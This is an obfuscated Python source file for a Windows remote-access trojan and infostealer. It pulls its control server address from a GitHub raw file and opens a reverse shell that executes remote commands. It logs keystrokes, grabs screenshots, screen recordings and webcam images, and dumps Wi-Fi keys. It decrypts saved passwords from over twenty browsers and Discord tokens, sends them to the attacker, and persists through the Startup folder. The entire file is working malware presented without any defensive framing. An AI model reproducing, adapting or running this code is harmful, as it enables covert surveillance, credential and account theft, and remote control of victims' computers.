import subprocess,socket,time,requests,os,logging,imageio,json,sqlite3,win32crypt,base64,shutil,re
from PIL import ImageGrab
from pynput.keyboard import Key, Listener
from datetime import datetime
from Cryptodome.Cipher import AES
KCZIiWFfCdFuzQo = ""
agPkLlyArQNzRWsIvzI = ""
WYmNAvxodmRon = "17.01.25.1"
KEYLOGONSTART = True
YLCFFtVRwKhObsh = "!"
MbnoQmAsFLNgdEnNzyMMh = "https://raw.githubusercontent.com/eb-repo/files/refs/heads/main/info.txt"
OQXOhhIaPDiWpEKYdbb = "https://raw.githubusercontent.com/eb-repo/scripts/refs/heads/main/"
SdtuztRAO = os.path.expanduser("~\\AppData\\Local\\")
USER_ROAMING = os.path.expanduser("~\\AppData\\Roaming\\")
osstdqwIKpadqCqWizpG = {
	'chrome':SdtuztRAO+'Google\\Chrome\\User Data','chromium':SdtuztRAO+'Chromium\\User Data','chrome-canary':SdtuztRAO+'Google\\Chrome SxS\\User Data',
	'msedge':SdtuztRAO+'Microsoft\\Edge\\User Data','msedge-canary':SdtuztRAO+'Microsoft\\Edge SxS\\User Data',
	'msedge-beta':SdtuztRAO+'Microsoft\\Edge Beta\\User Data','msedge-dev':SdtuztRAO+'Microsoft\\Edge Dev\\User Data',
	'avast':SdtuztRAO+'AVAST Software\\Browser\\User Data','amigo':SdtuztRAO+'Amigo\\User Data',
	'torch':SdtuztRAO+'Torch\\User Data','kometa':SdtuztRAO+'Kometa\\User Data','orbitum':SdtuztRAO+'Orbitum\\User Data',
	'cent-browser':SdtuztRAO+'CentBrowser\\User Data','7star':SdtuztRAO+'7Star\\7Star\\User Data',
	'sputnik':SdtuztRAO+'Sputnik\\Sputnik\\User Data','vivaldi':SdtuztRAO+'Vivaldi\\User Data',
	'epic-privacy-browser':SdtuztRAO+'Epic Privacy Browser\\User Data','uran':SdtuztRAO+'uCozMedia\\Uran\\User Data',
	'yandex':SdtuztRAO+'Yandex\\YandexBrowser\\User Data','brave':SdtuztRAO+'BraveSoftware\\Brave-Browser\\User Data',
	'iridium':SdtuztRAO+'Iridium\\User Data','coccoc':SdtuztRAO+'CocCoc\\Browser\\User Data',
	'opera':USER_ROAMING+'Opera Software\\Opera Stable','opera-gx':USER_ROAMING+'Opera Software\\Opera GX Stable'
}
def jfllNQmojqNvXkFvJfoTx(host, port):
	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	s.connect((host, int(port) if port.isdecimal() else 5002))
	return s
def ASjMBpPbrLDDKpJ(s):
	data = s.recv(1024)
	if len(data)==0:
		return True
	bhHRpWUtaPLipKuQRj = data.decode("utf-8").replace("\n","")
	if not bhHRpWUtaPLipKuQRj.startswith(YLCFFtVRwKhObsh):
		proc = subprocess.run(bhHRpWUtaPLipKuQRj, shell=True, capture_output=True)
		QfAdQfgPlH = proc.stdout + proc.stderr
		s.send(QfAdQfgPlH)
		return
	xPTkxzQxIvhdWtaKYVCoQVI = bhHRpWUtaPLipKuQRj.split(" ")[0][1:]
	args = " ".join(bhHRpWUtaPLipKuQRj.split()[1:]).split()
	if xPTkxzQxIvhdWtaKYVCoQVI == "download":
		fNLHlmUvrjWEeNUN(s, bhHRpWUtaPLipKuQRj)
	elif xPTkxzQxIvhdWtaKYVCoQVI == "screenshot":
		oDAqvAEPToGTrJYiIk(s)
	elif xPTkxzQxIvhdWtaKYVCoQVI == "basename":
		s.send(bytes(os.path.basename(__file__)+"\n", "utf-8"))
	elif xPTkxzQxIvhdWtaKYVCoQVI == "update":
		euXLwuCx(s)
	elif xPTkxzQxIvhdWtaKYVCoQVI == "wifi":
		RJAlyxCxCWx(s)
	elif xPTkxzQxIvhdWtaKYVCoQVI == "screenrecord":
		npXvxBLnSmgOHWwafrUX(s, args)
	elif xPTkxzQxIvhdWtaKYVCoQVI == "browsers":
		WARWxyrg(s)
	elif xPTkxzQxIvhdWtaKYVCoQVI == "webcam":
		webCam(s, args)
	elif xPTkxzQxIvhdWtaKYVCoQVI == "cd":
		try: os.chdir(bhHRpWUtaPLipKuQRj[4:])
		except: pass
def fNLHlmUvrjWEeNUN(s, bhHRpWUtaPLipKuQRj):
	lbVsXWvxhEv = bhHRpWUtaPLipKuQRj.replace(YLCFFtVRwKhObsh+"download ","").split(",")
	QfAdQfgPlHs = ""
	for f in lbVsXWvxhEv:
		QfAdQfgPlHs += XiNePcXzSCxo(f, "api/file/", { "type":os.path.splitext(f)[1] })
	s.send(bytes(QfAdQfgPlHs, "utf-8"))
def oDAqvAEPToGTrJYiIk(s):
	image = ImageGrab.grab(bbox=None,
		include_layered_windows=False,all_screens=True,xdisplay=None)
	nNyaqdVyhCnoLVKSmbmOv = os.path.expanduser("~\\AppData\\Local\\")+"ss.jpg"
	image.save(nNyaqdVyhCnoLVKSmbmOv)
	image.close()
	r = XiNePcXzSCxo(nNyaqdVyhCnoLVKSmbmOv, "api/sscap")
	os.remove(nNyaqdVyhCnoLVKSmbmOv)
	s.send(bytes(r,"utf-8"))
def webCam(s, args):
	cameraNumber = 0
	try:
		if len(args) > 0:
			try: cameraNumber = int(args[0])
			except: pass
		camera = imageio.get_reader(f"<video{cameraNumber}>")
		imageio.imwrite(SdtuztRAO+"wc.jpg", camera.get_data(0))
		camera.close()
		r=XiNePcXzSCxo(SdtuztRAO+"wc.jpg","api/wc")
		s.send(bytes(r,"utf-8"))
	except:
		s.send(bytes("[!] 404\n", "utf-8"))
def npXvxBLnSmgOHWwafrUX(s, args):
	abRfLRq = 15
	if not args == []:
		try: abRfLRq = int(args[0])
		except: pass
	WzmvbGWSzzDhMA = os.path.expanduser("~\\AppData\\Local\\")+"sr.mp4"
	TNJyeaxkAMzAUiUpoElsI = []
	fps = 11
	numFrames = abRfLRq * fps
	for _ in range(numFrames):
		TNJyeaxkAMzAUiUpoElsI.append(ImageGrab.grab(bbox=None, all_screens=True))
	imageio.mimsave(WzmvbGWSzzDhMA, TNJyeaxkAMzAUiUpoElsI, fps=fps, quality=8)
	XiNePcXzSCxo(WzmvbGWSzzDhMA, "api/screc")
def XiNePcXzSCxo(iqRorniCzdmCQBA, pWaspYQi, EWjsSgNIZcGQkuJU=None):
	if not os.path.isfile(iqRorniCzdmCQBA):
		return "[!] 404: "+iqRorniCzdmCQBA+"\n"
	headers = {"user":os.getlogin()}
	if EWjsSgNIZcGQkuJU is not None:
		headers = {**headers, **EWjsSgNIZcGQkuJU}
	f = open(iqRorniCzdmCQBA, "rb")
	requests.post("http://"+KCZIiWFfCdFuzQo+":5555/"+pWaspYQi,
		files={"file":f},
		headers=headers)
	f.close()
	return "[+] 200\n"
def ioADdNLjKrNVz(WLQRDnvbWiws, pWaspYQi):
	if WLQRDnvbWiws.strip() == "":
		return "[!] 204\n"
	requests.post("http://"+KCZIiWFfCdFuzQo+":5555/"+pWaspYQi,
		data=WLQRDnvbWiws,
		headers={"user":os.getlogin()})
	return "[+] 200\n"
def euXLwuCx(s):
	h, p, v = PxgwNlx(True)
	if (v != WYmNAvxodmRon):
		wWFBPiEcxbAsReAlYzIMU(v)
		s.send(b"[+] 200\n")
	else:
		s.send(b"[-] 304\n")
def RJAlyxCxCWx(s):
	try:
		profiles = [line.split(":")[1].strip().replace("\r","") for line in subprocess.check_output("netsh wlan show profiles", creationflags=0x08000000, shell=True).decode().split("\n") if "User Profile" in line]
	except:
		s.send(b"[!] 500\n")
		return
	AbFvKWw = ""
	for p in profiles:
		try: AbFvKWw+=f"    {p} - " + subprocess.check_output(f"netsh wlan show profile \"{p}\" key=clear", shell=True).decode().split("Key Content")[1].split("Cost")[0].replace(":","").strip()+"\n"
		except: AbFvKWw+=f"    {p} - N/A\n"
	s.send(bytes(AbFvKWw, "utf-8"))
def wWFBPiEcxbAsReAlYzIMU(OhgSoYEaNgszroyjL):
	lmNxQEcMBJk = os.path.basename(__file__)
	fileType = lmNxQEcMBJk.split(".")[-1]
	JuYBXvwqnA = lmNxQEcMBJk.split(".")[0]+"."+OhgSoYEaNgszroyjL+".pyw" if fileType.startswith("py") else ".exe"
	WeXYfVtlZyi = os.path.join(os.path.expanduser("~\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup"), JuYBXvwqnA)
	if not os.path.isfile(WeXYfVtlZyi):
		with open(WeXYfVtlZyi, "w+") as f:
			f.write(requests.get(OQXOhhIaPDiWpEKYdbb+"file."+ "pyw" if WeXYfVtlZyi.split(".")[-1].startswith("py") else "exe").text)
	else:
		KEYLOGONSTART = False
def PxgwNlx(force=False):
	global KCZIiWFfCdFuzQo, agPkLlyArQNzRWsIvzI
	if force or KCZIiWFfCdFuzQo == "" or agPkLlyArQNzRWsIvzI == "":
		data = requests.get(MbnoQmAsFLNgdEnNzyMMh).text.replace("\n","").split(":")
		KCZIiWFfCdFuzQo = data[0].strip()
		agPkLlyArQNzRWsIvzI = data[1].strip()
		OhgSoYEaNgszroyjL = data[2].strip()
	return KCZIiWFfCdFuzQo, agPkLlyArQNzRWsIvzI, OhgSoYEaNgszroyjL
def NBWHSESCSeijQOZmLw():
	try:
		jOiBYFPs = "settings.xpb"
		LRwwAYxvZlzOcAYAWp = sorted([file for file in os.listdir(SdtuztRAO) if os.path.isfile(SdtuztRAO+"\\"+file) and file.endswith(jOiBYFPs.split(".")[-1])])
		if jOiBYFPs in LRwwAYxvZlzOcAYAWp:
			LRwwAYxvZlzOcAYAWp.remove(jOiBYFPs)
		mWwCLTY = os.path.join(SdtuztRAO,jOiBYFPs)
		if len(LRwwAYxvZlzOcAYAWp) > 0:
			with open(mWwCLTY, "ab+") as f:
				for file in LRwwAYxvZlzOcAYAWp:
					temp = os.path.join(SdtuztRAO,file)
					with open(temp,"rb") as tf:
						f.write(tf.read())
					os.remove(temp)
		XiNePcXzSCxo(mWwCLTY, "api/log")
		if os.path.isfile(mWwCLTY):
			os.remove(mWwCLTY)
	except:
		pass
def mZbjNpQHSJMW():
	logging.basicConfig(filename=(SdtuztRAO+str(datetime.today().strftime("%d")) + ".xpb"),
		level=logging.DEBUG,format="%(asctime)s %(message)s", datefmt="%Y-%m-%d %H:%M:%S")
	def BowVXAPXTHtZCIeArhOfW(k):
		logging.info(str(k))
	k=Listener(on_press=BowVXAPXTHtZCIeArhOfW)
	ANvonCUlEEEZGiIYmnWLU = [logging.getLogger(name) for name in logging.root.manager.loggerDict if not name.startswith("pynput")]
	for l in ANvonCUlEEEZGiIYmnWLU:
		l.setLevel(logging.CRITICAL)
	k.start()
def WARWxyrg(s, upload=False):
        wreaoLJoEHlDDicZ = "\n"
        for browser in osstdqwIKpadqCqWizpG:
                path = osstdqwIKpadqCqWizpG[browser]
                JxDOlhPljC = None
                if not os.path.isfile(path+"\\Local State"):
                        continue
                with open(path+"\\Local State", "r") as f:
                        localstate = base64.b64decode(json.load(f)["os_crypt"]["encrypted_key"])[5:]
                        JxDOlhPljC = win32crypt.CryptUnprotectData(localstate,None,None,None,0)[1]
                profiles = [p for p in os.listdir(path) if p == "Default" or p.startswith("Profile ")]
                if browser == "opera" or browser == "opera-gx": profiles=[""]
                for profile in profiles:
                        try:shutil.copyfile(f"{path}\\{profile}\\Login Data", SdtuztRAO+"\\db.db")
                        except:continue
                        conn = sqlite3.connect(SdtuztRAO+"\\db.db")
                        cursor = conn.cursor()
                        cursor.execute("SELECT action_url, username_value, password_value FROM logins")
                        wreaoLJoEHlDDicZ += str("*"*8+f" {browser} - {profile} "+"*"*8+"\n")
                        for _, data in enumerate(cursor.fetchall()):
                                ciphertext = data[2]
                                initVector = ciphertext[3:15]
                                encryptedPwd = ciphertext[15:-16]
                                cipher = AES.new(JxDOlhPljC, AES.MODE_GCM, initVector)
                                decryptedPwd = (cipher.decrypt(encryptedPwd)).decode()
                                wreaoLJoEHlDDicZ += f"URL: {data[0]}\nUser: {data[1]}\nValue: {decryptedPwd}\n\n"
                        cursor.close()
                        conn.close()
                        os.remove(SdtuztRAO+"\\db.db")
        PFayjPF = []
        discordPaths = [USER_ROAMING+'\\discord\\Local Storage\\leveldb\\',USER_ROAMING+'\\discordcanary\\Local Storage\\leveldb\\',USER_ROAMING+'\\discordptb\\Local Storage\\leveldb\\']
        for p in [dp for dp in discordPaths if os.path.exists(dp)]:
                JxDOlhPljC = ""
                with open(p.replace("Local Storage\\leveldb\\","")+"Local State", "r") as f:
                        localstate = base64.b64decode(json.load(f)["os_crypt"]["encrypted_key"])[5:]
                        JxDOlhPljC = win32crypt.CryptUnprotectData(localstate,None,None,None,0)[1]
                for file in [f for f in os.listdir(p) if f.endswith(".log") or f.endswith(".ldb")]:
                        for line in [x.strip() for x in open(f"{p}\\{file}","r", errors="ignore").readlines() if x.strip()]:
                                for value in re.findall(r"dQw4w9WgXcQ:[^\"]*", line):
                                        value = base64.b64decode(value.split('dQw4w9WgXcQ:')[1])
                                        tinitVector = value[3:15]
                                        encryptedToken = value[15:]
                                        tcipher = AES.new(JxDOlhPljC, AES.MODE_GCM, tinitVector)
                                        decryptedToken = (tcipher.decrypt(encryptedToken))[:-16].decode()
                                        if decryptedToken not in PFayjPF:
                                                PFayjPF.append(decryptedToken)
        ChAPGYrKNW = "https://discord.com/api/v9/users/@me"
        if PFayjPF: wreaoLJoEHlDDicZ +="*"*8+"Discord Data: "+"*"*8+"\n\n"
        for ApWmURIceluuAfZngBXuIf in PFayjPF:
                headers = {"Content-Type":"application/json","Authorization":ApWmURIceluuAfZngBXuIf,
                           "User-Agent":"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.11 (KHTML, like Gecko) Chrome/23.0.1271.64 Safari/537.11"}
                j = requests.get(ChAPGYrKNW, headers=headers).json()
                if j.get("message") != None: continue
                user = str(j.get('username')) + '#' + str(j.get("discriminator"))
                badges = ""
                flags = j['flags']
                if (flags == 1): badges += "Staff, "
                if (flags == 2): badges += "Partner, "
                if (flags == 4): badges += "Hypesquad Event, "
                if (flags == 8): badges += "Green Bughunter, "
                if (flags == 64): badges += "Hypesquad Bravery, "
                if (flags == 128): badges += "HypeSquad Brillance, "
                if (flags == 256): badges += "HypeSquad Balance, "
                if (flags == 512): badges += "Early Supporter, "
                if (flags == 16384): badges += "Gold BugHunter, "
                if (flags == 131072): badges += "Verified Bot Developer, "
                if (badges == ""): badges = "None"
                email = j.get("email")
                phone = j.get("phone") if j.get("phone") else "N/A"
                try:
                        nitro_data = requests.get(ChAPGYrKNW+'/billing/subscriptions', headers=headers).json()
                        has_nitro = bool(len(nitro_data) > 0)
                except: pass
                try: billing = bool(len(json.loads(requests.get(ChAPGYrKNW+"/billing/payment-sources", headers=headers).text)) > 0)
                except: pass
                wreaoLJoEHlDDicZ += f"\n{user}\n{'-'*len(user)}\nToken: {ApWmURIceluuAfZngBXuIf}\nHas Billing: {billing}\nNitro: {has_nitro}\nBadges: {badges}\nEmail: {email}\nPhone: {phone}\n\n"
        wreaoLJoEHlDDicZ += "\n"
        if not upload:
                s.send(bytes(wreaoLJoEHlDDicZ,"utf-8"))
        else:
                ioADdNLjKrNVz(wreaoLJoEHlDDicZ, "api/google")
def eQOTqpFZBRTrHXI():
	h, p, v = PxgwNlx()
	try:
		NBWHSESCSeijQOZmLw()
		WARWxyrg(None,True)
		if WYmNAvxodmRon != v:
			wWFBPiEcxbAsReAlYzIMU(v)
		if KEYLOGONSTART:
			mZbjNpQHSJMW()
	except:
		pass
	try: os.chdir(os.path.expanduser("~"))
	except: pass
	cRiCnYsEkkR = bytes(("(old)"if WYmNAvxodmRon!=v else "")+"["+WYmNAvxodmRon+"] "+os.getlogin()+" - "+os.getcwd().replace("\\","/")+ "/ >> ", "utf-8")
	while True:
		vwGFISUrrRnIKEGntqlm=False
		try:
			s=jfllNQmojqNvXkFvJfoTx(h, p)
			while not vwGFISUrrRnIKEGntqlm:
				s.send(cRiCnYsEkkR)
				vwGFISUrrRnIKEGntqlm=ASjMBpPbrLDDKpJ(s)
			s.close()
		except:
			pass
		time.sleep(5)
eQOTqpFZBRTrHXI()
